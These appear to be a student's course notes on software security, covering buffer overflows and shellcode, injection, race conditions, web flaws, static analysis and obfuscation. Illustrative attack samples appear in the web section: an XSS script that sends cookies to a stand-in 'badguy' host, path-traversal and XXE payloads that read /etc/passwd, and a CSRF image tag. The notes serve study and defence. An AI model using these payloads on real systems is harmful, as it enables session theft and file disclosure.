## Introduction
Heartbeating messages: no client can be trust
Injection
Hardware flawed

what do i do for only paper work?

*Safety* is concerned with ensuring bad things don't happen **accidently** e.g., maintenance checks
*Security* is concerned with ensuring that bad thins don't happen because of **malicious actions by others** e.g., terrorists

Software security
*Design flaws* are likely
*Bugs* seem inevitable
They lead to vulnerabilities which exploitable by attackers
A security risk assessment for a system should consider **different attackers and motives**

Privacy, Regulations --> Awareness

Attackers have the advantage
- attacker: one viable attack route
- defenders: anticipate all

Frontiers
- Mobile
- Cloud: XaaS
- Repeating same mistakes
- Cyber resilience: speedy, automatic recovery
- Datasharing: privacy

## Landscape
*Threat*: should be robust against local and remote attackers
*Vulnerability*: A mistake that can be used by a hacker to violate a "reasonable" security policy for a system 系统漏洞
- security review ==> dedicated review in high value situations
- *Security Advisory*: affected versions
- Vulnerability code
- Fix
*Defences*
*Processes*
- *Common Vulnerability Enumeration* Identifiers: standardise common vulnerability or exposure
*Methods*

![](../img/Pasted%20image%2020251215235633.png)

*Vulnerability*: A mistake can be used by a hacker to **violate** a "reasonable" security policy for a system 核心逻辑漏洞，导致不符合系统预期的事件
*Exposure*: A system configuration issue or mistake in software that can be used by a hack as a stepping-stone into a system or network 信息收集，暴露点

#### BSIMM
Maturity Model, degree of formality/rigour off process
Examines *Software Security Initiatives* (SSIs), state-of-the-art
- inform risk management decisions
- Clarify "right thing todo" for those involved
- Reduce costs via standard, repeatable process
- Improve code quality

*SSI*
- 4 domains covering 12 practices, 126 activities
	- Governance
	- Intelligence
- maturity levels 1 (most mature) to 3 (least mature, emerging activity)

## Memory Corruption
"Coding" stage
Exploits is means to "Fix" and "Learn"

1. Design: requirements, architecture
2. Implementation: coding, tests
3. Deployment: configuration, feedback

Unconstrained read/writing of memories, lead to arbitrary execution, remote command execution
- stack overflows
- heap overflows
- type confusion
- pointer arithmetic
- out-by-one, arithmetic errors

Low-level programs manipulate memory directly: C or assembler
- pointer, null pointer

### Memory safety
> A programming language enforces *memory safety* if it ensures that reads and writes stay within clearly defined memory areas, belonging to different parts of the program.

**Memory areas**
*Code* (compiled program, shared lib)
*Data*: non-local program variables, **global** or **static**, program **heap** for dynamically allocated data
*Stack*: records dynamically allocated data for each of the currently executing functions/methods, **local**, **current object** reference and **return** address

![](../img/Pasted%20image%2020250923195401.png)

*Stack overflows* mainly relevant for C, C++ and other unsafe languages with **raw memory access**

> The malicious argument overwrites all of the space allocated for the buffer, all the way to the **return address location**. The return address is altered to point back into the stack, somewhere before the attack code. Typically, the attack code executes a shell.

*Stack* => Abstract Data Type, only stacks built via operations can be constructed

Frame pointer may be used to help locate arguments and local variables
![](../img/Pasted%20image%2020250925192724.png)

### Buffer overflow
*Spatial memory errors* 空间错误: memory access goes outside the region of memory that a date item is intended to occupy
*Temporal memory errors* 时间错误: memory access happens in some regions of memory that the program ought not currently have access to

#### Stack overflows
*Stack variable corruption*
Local variables are put close together on the stack
- If a stray write goes beyond the size of one variable, it can corrupt another
- putting m bytes into a buffer of size n, for `m > n`, corrupts the surrounding memory

By *overwriting the return address*, set it to points
- known piece of application code / shared library
- shellcode: own attack code

##### Write code for an attacker
*Shellcode*
- small and self-contained
- position independent
- free of ASCII NUL (0x00) characters

`execve()`: starts a process with the given name and argument list and the environment as the third parameter
- `#include <unistd.h>` in Standard C Library
- `int execve(const char *pathname, char *const argv[], char *const envp[]);`
	- `pathname`: executable file and its path
	- `argv[]`: arguments to the new program, `argv[0]` as program name
	- `envp[]`: environment variable to the new program, in `"KEY=VALUE"`
- Only return `-1` when failed, then `errno` are set
- 用另一个程序镜像替换当前进程的镜像，调用它的进程会丢弃当前的代码段、堆、栈等用户空间内容，启动一个新的可执行性文件，在同一个PID下运行新程序，如果成功，不会返回
- A exactly to a system call

**Invoking system calls**
Linux calls: 
- store parameters in registers EBX, ECX
- put the desired system call number into AL
- `int 128`
![](../img/Pasted%20image%2020250925233127.png)
`$0x80` equivalent to `128`, the kernel executes the system call according to the value of `EAX`
- `EAX = 11 (0xb)` means `execve` system call
- relevant parameters are set to other registers

**Binary representations**
Encode the hex op code of malicious input
https://shell-storm.org/shellcode
https://www.exploit-db.com/shellcodes

##### Store executable code in memory & implement stack overflow
*shellcode on stack*
*shellcode in another part of the program data*
定位问题

The overflow uses a **NOP sled** before the shellcode, which the CPU execution "lands on", before being directed to the attack code

*Return to library (ret2libc)*
The attacker overflows a buffer causing the return instruction to jump to invoke `system()` with an argument pointing to `/bin/sh`

*Return-oriented Programming (ROP)*
Sequences of instructions (gadgets) from library code are **assembled together** to manipulate registers, eventually to invoke an library function or even to make a Turing-complete language

#### Heap overflows
**Dynamically allocated data** region of memory
- The runtime OS provides *memory management*
- library functions

*Undefined behaviours*
> A programming language specification defines the meaning of programs. Without memory safety, the specification may say the meaning of an illegal memory access is undefined

`malloc(size)`: uninitialized memory & `calloc(size)`: initialize to 0

##### Specific heap attacks
![](../img/Pasted%20image%2020250930192747.png)
`strcpy()` function
![](../img/Pasted%20image%2020250930192922.png)
![](../img/Pasted%20image%2020250930192948.png)

might cause crashes

##### General heap attacks
The OS arranges continuously memory chuncks (blocks) to applications

*Heap Blocks Headers*
- size of previous block
- size of this block
- flags (e.g. freeflag)
- if not in use, pointers to next/previous free block

`unlink()` do an arbitrary write

### Out-by-one
字符串的结束符一个字符
Integer overflow: 分配二维矩阵没有检查n\*m数值大小是否溢出，结果会是一个小值或者无效值
### Type confusion errors
*Type safety*
> A programming language, analysis tool or runtime is said to enforce **type safety** if it has a clearly specified typing discipline for data values and it ensures that data values fr types stay within the domain of those during program execution

C
- implicit type conversions
- expllicit type casts

### Memory Corrption Countermeasures
Give devence indepth taht can protect in case of new attacks, malware, regressions to vulnerable code
- Tamper detection in software
- Memory protect in OS and hardware
- Diversification methods

#### Tamper detection
Wrap frame with protective layer, canary sits below return address. Attacker overflows atack buffer to hit return address

Attackers respond to new protection mechanisms by looking for mulnabilities th those mechanisms

#### Memory mode protection
Isolation different processes have different resouces
Sharing resources are shared between processes, partial isolation

Granularity of protection
- *Fencs*: separate memory accesses between OS and user code
- *Base and bounds regiester*: enforce separation between several programs allowing access control on memory ranges
- *Tagged architecture*: tag on each memory locatoin set access rights to stored word, not supported in modern
- *Paging*: split program/data into pieces, mapped onto memory separately

#### Diversification
Make many versions of same program; thwarts general attacks that assume some fixed structure
*ASLR*: randomising layout suring load time makes it harder to find data or code locations
- small amounts could be brute force

#### Defensive programming
*Bounds checking*
- data length
- array subscripts
- boundary conditions: off-by-one
- size of inputs
- dangerous API calls

![](../img/Pasted%20image%2020251007195427.png)

*Automated code review*: code checking tools
- Memory faults
	- Valgrind: Dynamic runtime vulnerability, 
	- AddressSanitizer: compile time

## Injection
*CWE: Common Weakness Enumeration*
25 top

**Always check your inputs!**

Downstream component
- call to a library function
	- picture / movie
	- execute an OS command
- a message sent to another service
	- web query / web API call
	- query database

*Trust assumptions*
Programmers make trust assumptions concerning which parts of the system they believe will behave as expected.

### Command injection
Programmers often insert **system command** calls in application code, interpreted by a **command shell**

Metadata & meta-characters
- In-band representation: embeds metadata into the data stream
- Out-of-band representation: separates metadata from data

separators / delimiters
escape-sequence: describe additional data

*Input validation*
Block lists (characters)
- reject
- filter
- sanitize

Sub-process: risky as they invoke a **shell** to process the commands
- `system()` in C, equivalently to `/bin/sh -c <cmd>`
- `popen()` executes a command as a sub-process, returning a *pipe* to send or read data

Some attacks exploit differences in meta-characters between languages

environment variables

DLL in Windows: search order to PATH environment variables
Unix use a search path which can be defined/overridden by variables
	`LD_LIBRARY_PATH`
	`LD_PRELOAD`

IFS changing CVE-2014-6271
### SQL Injection
Routes
- GET/POST
- Cookie
- 服务器变量（HTTP header）
- 二次注入

提取，修改，绕过认证，执行任意命令

Forms of SQL Injection
- 恒真
- 报错回显
- `UNION`联合查询
- `;`双语句查询
- 布尔盲注、时间盲注
- 数据库存储过程漏洞

Idea: use static analysis pre-processing to generate a dynamic detection tool:  
1. Find SQL query-generation points in code  
2. Build SQL-query model as NDFA which models SQL grammar, transition labels are tokens  
3. Instrument application to call runtime monitor  
4. If monitor detects violation of state machine, triggers error, preventing SQL query  
#### Defence
静态分析 动态监测攻击 SQLRand
## Racing
### Race conditions
多进程和多CPU并行，
![](../img/Pasted%20image%2020251016193515.png)
访问文件的时间窗口差
在检查和open之间对文件修改恶意代码
*Unix*
1. 多次解析相同文件
2. Permission Races: 文件创建时是`0666`
3. Ownership Races
4. Directory Races
5. Temporary File Races
	- `fd = mkstemp(temp);`
### Data Races
两个或多个线程，访问同一共享变量，多次读写导致非确定性结果
Atomic memory accesses
Multi-threaded programs

> A data race occurs when two or more threads access a shared variable:  
1. (potentially) at the same time, and  
2. at least one of the accesses is a write

*No out-of-thin-air*
Write speculation in JAVA

- Ensuring atomicity: enforce mutual exclusion
- Using locks: mutual exclusion for shared resources

Dynamic analysis: monitor every access to every memory location and see whether the access might have reces with a previous access from a different thread
- *Lockset algoorithm*: every shared variable is protected by at least one lock
![](../img/Pasted%20image%2020251021193652.png)
- Eraser tool
![](../img/Pasted%20image%2020251021192935.png)

Static analysis
GuardedBy

## Secure development
*McGraw's Three Pillars*
![](../img/Pasted%20image%2020251021193233.png)

Run security activities alongside traditional

![](../img/Pasted%20image%2020251021193503.png)

### Code review
- industry: economy choices, rush, no extratime
- Manual: -> agile
	- subtle
	- onerous, large code bases
- Automatic: human config, increasingly sophisticated

### Architectural risk analysis
  
- the security threats that attackers pose to assets  
- vulnerabilities that allow threats to be realised  
- the impact and probability of an attack  
- hence the risk, as risk = probability × impact  
- countermeasures that may be put into place
![](../img/Pasted%20image%2020251021195019.png)

![](../img/Pasted%20image%2020251021195000.png)

![](../img/Pasted%20image%2020251021195051.png)

Think adversarily

![](../img/Pasted%20image%2020251021195319.png)

### Penetration testing
Ethical hacking: finds real problems
Modern professional pen testing uses source
last check before deployment, use as regression tests
For repairing software, not deploying work-arounds

### Security testing
*Strategy for security testing*
![](../img/Pasted%20image%2020251021200146.png)
### Abuse cases
attack patterns
Examine assuptions
unexpected events
anti-requirements

### Security requirements
Functional security requirements: 
- cryptography
- audit trail
- privacy: only gather essential data
Emergent security requirements:
- minimise sode channels

### Security operations
managing the security of the deployed software
Information security professionals
- Incident handling, proactive threat monitoring  
- Range and mechanisms of vulnerabilities, cross systems  
- Understanding and deploying desirable patches  
- Configuring firewalls, IDS, virus detectors, etc

Coders: expert
- Software design, application architecture  
- Programming, often single languages  
- Build systems, overnight testing

## Web Application Security
OWASP Top 10
Exploits and vulnerabilities would appear at any level of tech stack

Knowing what is happening at the bottom of the stack is important to  
understand fundamentally how web security provisions work
- Understand higher-level problems
- How the bottom layers work to study the detail of web exploits as they have evolved

Client != Browser
![](../img/Pasted%20image%2020251023194807.png)

`Referer: http://www.ed.ac.uk/loggedin`
![](../img/Pasted%20image%2020251023195114.png)

Get and POST
![](../img/Pasted%20image%2020251023195448.png)

RFC 3986
![](../img/Pasted%20image%2020251028201728.png)

```
javascript://expmple.com/%0alert(1)
malito://user@example.com
```

### Broken access control
#### Object references
PHP: arbitrary file access
```
http://researchsite.ed.ac.uk/showhtml.php?title=User+Manual&file=%2Fetc%25passwd
```
- the app developer (implicitly) authorized users, no explicit authorization code was written, should have a *re-authorization* step
- PHP code didnt check the filename returned
- Should only allow access to its own recouces

Data indirection: index or hash table using for eliminate direct chosen data/file access

Hidden input of the server: To prevent *client-side tampering*, a *MAC* (Message Authenticate Code) constructed with a **server-side secret key**, validate after form submission (return to the server)
- data integrity guarentee

Other mistakes:
*Assuming requestss occour in proper order*
- assuming user must issue a GET to retrieve a form then POST
*Authorization by obscurity*
- a web page is not linked to the main site, assuming that only people who are given it (know it in advance) will be able to reach it

#### Function access
Much more dangerous
- Hiding nevigation (admin) links to unauthorized sections
- wrongly assuming this prevents non-authorized users visiting them

Well-specified polity
Manage authorization in a separate module
Make authorzation chesks for each fucntion
*Deny-by-default* policy

![](../img/Pasted%20image%2020251028205716.png)

#### XSS and Output Filtering
Attacker tricks app into displaying malicious code
*Session hijacking*: steal session cookies
![](../img/Pasted%20image%2020251028210047.png)

```javascript
<script>  
	document.location.replace(  
	"http://www.badguy.example/steal.php"  
	+ "?what=" + document.cookie)  
</script>
```

*Persistent XSS*: malicious code is stored on the server, many visitors might execute it 
*Reflected XSS*: injected malicious code, immidiately dislayed in the visited page
```
http://mymanpages.org/manpage.php?title=<script>...</script>?program=gcc
```

***Always check your outputs***

Solutions
- HTML encoding
- Marked up output: complex filtering: rule out risky tags
- Marked up output: DSL: Domain Specific Language, convert to secure HTML (eliminated risky tags)

### Cookies and Sessions
![](../img/Pasted%20image%2020251030202942.png)

#### Session hijacking
Many web apps use session IDs as a credential
- Attacker can steals it
- XSS, sniffing, interception
- calculate, guess, brute-force

Session fixation
- using same SID form unauthenticated to logged in
- attacker grabs/sets SID before user visits site

*Defence*
Link SID to IP address of client
- NAT problem
- mobile taptop?
Link SID to HTTP Headers, e.g. User-Agent
- can be trivially faked, and usually guessed

#### CSRF: Cross Site Request Forgery
1. get user to open malicious action
2. browser undertakes action on target site

exploits:
- local internet website
- banking or email site user is logged into
- browser is authorized to connect here

```html
<form action="http://geemail.com/send_email.htm" method="GET">  
	Recipient’s Email address: <input type="text" name="to">  
	Subject: <input type="text" name="subject">  
	Message: <textarea name="msg"></textarea>  
	<input type="submit" value="Send Email">  
</form>


http://geemail.com/send_email.htm?to=bob%40example.com  
&subject=hello&msg=What%27s+the+status+of+that+proposal%3F

<img src="http://geemail.com/send_email.htm?to=charliegeemail.com&subject=Hi&msg=My+email+address+has+been+stolen">
```

use a good framework that provides built-in protections
- not use GET
- double cookie, repeated in POST
- special CSRF token, check in server side, save state
- browser sandboxing

*CORS: Cross-Origin Resource Sharing*
Uses new HTTP headers from server to allow responses to indicate violations of same-origin

#### Unvalidaated Redirects
phishing

- do not use redirects at all
- use them but only with hard wired URLS
- if user-supplied parameters must be used, indirection

#### XML External Entities
Web applications process XML documents which can contain external  
references given as URIs.  
XML processors may obey these without restriction.  
Attacker may be able to upload/control files

payloads: 
- 本地文件读取
- SSRF/内网探测
- 拒绝服务DoS
- 凭证/密钥泄露
- 反序列化

restrictive and specific formats for exchanging data, configure DTD and XML to vslidate documents, security checks

Nasty attacks
```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

A billion laughs

#### Insecure Deserialization

## Code review and Architectural Analysis
![](../img/Pasted%20image%2020251104204532.png)

![](../img/Pasted%20image%2020251104223142.png)

Weaknesses classify Vulnerabilities
![](../img/Pasted%20image%2020251104204735.png)
https://cwe.mitre.org/data/pdfs.html

### Static analysis
White box technique: source code/binary code
- assurrance of good behaviour
- evidence of bad behaviour

it examines every code path, and  
it considers every possible input
![](../img/Pasted%20image%2020251104205311.png)

False negative problem
- 路径爆炸/可达性分析不足
- 上下文/环境缺失
- 抽象/模型不足
- 库/框架特性
- 配置/规则不足
- 性能/工程权衡

One missed bug enough for an attacker to get in!

#### Style checking
save practice

#### Type checking
possible value check
variable memory length check

*Gradual typing*
- infer types in parts of code where possible
- manually add type annotatoins elsewhere
- TypeScript

Type systems: modularity
- type check program pieces separately ==> whole type-checked

MATE
![](../img/Pasted%20image%2020251106222157.png)

#### Program understanding
Tools:
- Navigation
- Refactoring
- Inferring design

structure101
Jujaba and Reclipse
![](../img/Pasted%20image%2020251106203757.png)

**Model based testing**



#### Program Verification & Property checking
Gold standard, formal specification
- theorem proving
- model checking

Lightweight formal methods: make specifications be standard and generic
Static checking

*Assertion checking*: dynamic runtime checks, to test properties teh programmer expects to be true
assertion tests usually disabled

*Contracts* 
use explicit pre- and post-conditions supplied by teh programmer when developing code

*Design by Contract (TM)* aims to build a system as a set of components whose interaction is governed by mutual obligations, or contracts.
*Hoare triple*$$\{P\}C\{Q\}$$where C is a program command, P is aa pre-condition and Q is a post-condition

*Effel*: besides pre and post conditions, class invatiants which must be established when an object is created and maintained whenever it is modified

*Defensive programming*: adds checks to code to ensure that pre-conditions are met

`strncat(dest, src, num)`, throus warnings when preconditions `maxRead()` and `maxSet()` are not set

*Bound/range Analysis*
- `alloc_size(dest) > strlen(src)`
- `array_size(a) > n` before a\[n\]access

*Type State (resource) Tracking*
isnull(ptr), nonull(ptr)  
isopen_for_read(handle), isclosed(handle)  
uninitialized(buffer), terminatedstring(buffer)

avoiding double-free errors
![](../img/Pasted%20image%2020251111202237.png)

Null pointers
#### bug finding
severity
confidence

anti-idiom: double-checked locking in Java

## Information Leakage
### Language-based security approach

CIA triple:
- Confidentiality
- Ingetrity
- Availability

> Information is confidential if it cannot be learned by unauthorised principals.

Browser: *Single Origin Policy* (SOP): web page elements must come from same domain, else block/warn, too restrictive
- CSP
- CORS
- SameSite attribute cookies

### Taint tracking
- Data from taint sources
- Data arising from or influenced by tainted data

sanitization

Dynamic taint analysis

> Preventing code injection exploits using dynamic taint tracking is like letting a thief in your house and checking his bag for stolen goods at the very moment he tries to leave. It might work, but only if you never lose track of the gangster and if you really know your house. However, I would prefer a solution that does not let thieves in my house in the first place.

### Type-checking

security level
- high: sensitive information
	- computed directly from high data
	- occurs in a high context
- low: public information

Static guarantee
> Theorem: Typability implies no insecure flows 
> If an output expression has type low, then it cannot be affected by any input of type high. Hence there can be no insecure information flows in the program.

For any two executions of the program which differ only in high  
inputs, the result of low outputs does not change.

Preventing jumps to tainted addresses
- implicit flows

![](../img/Pasted%20image%2020251111214010.png)

basic rules
![](../img/Pasted%20image%2020251111214036.png)

compound rules
![](../img/Pasted%20image%2020251111214053.png)

![](../img/Pasted%20image%2020251111205401.png)

![](../img/Pasted%20image%2020251111205613.png)

## Software Protection

### Code signing
![](../img/Pasted%20image%2020251113202700.png)
- Code integrity and authenticity
- Detects tampering before code execution
- Aims to protect recipient from unsafe code: malware


### Program objuscation
```c
char O,o[];main(l){for(;~l;O||puts(o))O=(O[o]=  
~(l=getchar())?4<(4ˆl>>5)?l:46:0)?-~O&printf("%02x ",l)*5:!O;}
```
Obfuscating compiler
functionally equivalent program
![](../img/Pasted%20image%2020251113203453.png)

*Black box simulator* $S^P$ of P can onlu observe the input-output behaviour of P, nothing about its code or timing
Secure Virtual Black-box" 分析混淆代码并不会带来额外知识或洞察

Derived: cryptographic primitives
- **Symmetric to Asymmetric crypto**: An obfuscated symmetric encrypt function $C(E_k)$ with a key `k`, thus anyone can encrypt but only the owner who knows `k` can decrypt
- **Homomorphic encryption**: Homomorphic encryption allows general computation on encrypted data. For any boolean operation f, the plain program P computes $E_k(f(D_k(x)))$. Its obfuscated version $C(P_k)$ hides the key K and encryption method.

> It is impossible to construct an obfuscating compiler that satistfies virtual black box security.
- counterexample

### Tamperproofing
**Check**, to see if tampering has occurred
- code checking
- result checking
- environment checking

**Respond** somehow, imposing a penalty
- termination
- restore
- degrade: slow down operatoin
- report
- punish: destroy program, data or environment

> One technique is to to use multiple hashing methods and compute multiple hashes on fragments of code. 
> Then spread the hash computation repeatedly throughout the code. 
> To help prevent attackers figuring out the scheme, tamperproofing is combined with obfuscation.

### Watermarking
![](../img/Pasted%20image%2020251113204748.png)
Program $P_w=embed_k(P,w)$
- should be recoverable with a secret key k
- should be robust
- high credibility